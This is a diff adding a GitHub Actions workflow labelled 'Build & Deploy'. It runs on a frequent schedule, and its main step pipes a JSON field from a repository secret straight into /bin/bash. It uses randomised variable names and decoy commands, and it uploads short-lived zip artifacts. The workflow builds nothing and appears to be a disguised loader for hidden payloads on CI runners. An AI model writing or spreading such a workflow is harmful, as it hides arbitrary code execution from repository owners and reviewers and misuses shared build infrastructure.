@@ -1,0 +1,36 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '15 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          fqv625: ${{ secrets.fqv625 }}
+        run: |
+          printf '%s' "$fqv625" | jq -r .sklg025 | /bin/bash
+          printf '%s' "$mnb917" | jq -r .maght303 | /bin/bash
+          echo $djr6 | jq -r .bsbz8124 | /bin/bash
+          printf '%s' "$zor8798" | jq -r .boid4 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: dQ568xWC
+          path: "*.zip"
+          retention-days: 1
